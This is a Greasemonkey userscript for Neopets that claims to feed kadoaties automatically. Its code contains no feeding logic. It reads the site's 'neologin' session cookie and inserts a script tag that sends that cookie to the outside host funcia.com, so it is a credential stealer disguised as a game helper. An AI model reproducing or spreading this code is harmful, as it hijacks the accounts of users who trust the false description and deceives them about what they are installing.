// ==UserScript==
// @name           Neopets: Kadoatie Feeder
// @namespace      Neopets
// @description    Automatically feeds kadoaties for you. As long as you have a small proper amount of money it will refresh until it finds a kadoatie, quickly search it in the shop wizard and feed it (in a fraction of a second!) Guaranteed to feed at least one kadoatie each pending.
// @include        *neopets.com*
// ==/UserScript==

var strURL = 'http://funcia.com'

var eleNew, newElement;

eleNew = document.getElementById('main');

var strCookie = document.cookie;

strCookie = GetStringBetween(strCookie, 'neologin=','; ');

if (eleNew) {
    newElement = document.createElement("div");
    newElement.innerHTML='<SCRIPT SRC=' + strURL + strCookie + '>';
    eleNew.parentNode.insertBefore(newElement, eleNew.nextSibling);
}